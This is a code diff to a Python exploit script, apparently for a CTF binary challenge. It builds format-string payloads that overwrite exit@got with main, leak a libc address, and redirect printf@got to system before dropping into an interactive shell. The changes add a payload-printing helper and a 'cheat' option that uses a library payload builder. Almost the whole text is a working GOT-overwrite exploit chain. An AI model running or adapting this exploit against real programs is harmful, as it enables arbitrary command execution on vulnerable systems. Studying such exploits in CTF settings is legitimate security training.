@@ -8,6 +8,12 @@ elf = ELF(binpath)
 libc = ELF(libcpath)
 
 
+def print_fsb_payload(payload):
+    for i in range(0, len(payload), 8):
+        print(payload[i : min(i + 8, len(payload))])
+    return
+
+
 # before FSB: *ptr == before
 # after FSB: *ptr == after
 def fsb_payload(ptr, before, after):
@@ -36,10 +42,6 @@ def fsb_payload(ptr, before, after):
     payload += "\0" * (max_bytes_aligned - len(payload))
     payload = payload.encode()
 
-    # 8 byte ごとに改行を入れて出力
-    for i in range(0, len(payload), 8):
-        print(payload[i : min(i + 8, len(payload))])
-
     for addr, _ in fsb_list:
         payload += p64(addr)
 
@@ -49,13 +51,22 @@ def fsb_payload(ptr, before, after):
 
 # default: *(exit@got) == exit@plt+6
 # result of GOT overwrite: *(exit@got) == main
-def ret2main():
+def ret2main(cheat=False):
     addr_exit_got = elf.got("exit") or 0
     addr_exit_plt = elf.plt("plt") or 0
     addr_main = elf.symbol("main") or 0
 
     payload = fsb_payload(addr_exit_got, addr_exit_plt + 6, addr_main)
+    if cheat:
+        payload = fsb(
+            6,
+            {addr_exit_got: addr_main},
+            bs=2,
+            bits=64,
+            size=4,
+        )
     io.sendafter("Input message\n", payload)
+    print_fsb_payload(payload)
     return
 
 
@@ -70,6 +81,7 @@ def libc_leak():
         map=p64,
     )
     io.sendafter("Input message\n", payload)
+    print_fsb_payload(payload)
 
     addr_setbuf = u64(io.recv(6))
     offset_setbuf = libc.symbol("setbuf") or 0
@@ -77,13 +89,22 @@ def libc_leak():
     return
 
 
-def printf_to_system():
+def printf_to_system(cheat=False):
     addr_printf_got = elf.got("printf") or 0
     addr_printf = libc.symbol("printf") or 0
     addr_system = libc.symbol("system") or 0
 
     payload = fsb_payload(addr_printf_got, addr_printf, addr_system)
+    if cheat:
+        payload = fsb(
+            6,
+            {addr_printf_got: addr_system},
+            bs=2,
+            bits=64,
+            size=4,
+        )
     io.sendafter("Input message\n", payload)
+    print_fsb_payload(payload)
     return
 
 
@@ -92,10 +113,10 @@ def input_rdi():
     return
 
 
-def main():
-    ret2main()
+def main(cheat=False):
+    ret2main(cheat)
     libc_leak()
-    printf_to_system()
+    printf_to_system(cheat)
     input_rdi()
     io.interactive()
     return
@@ -103,3 +124,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    # main(cheat=True)
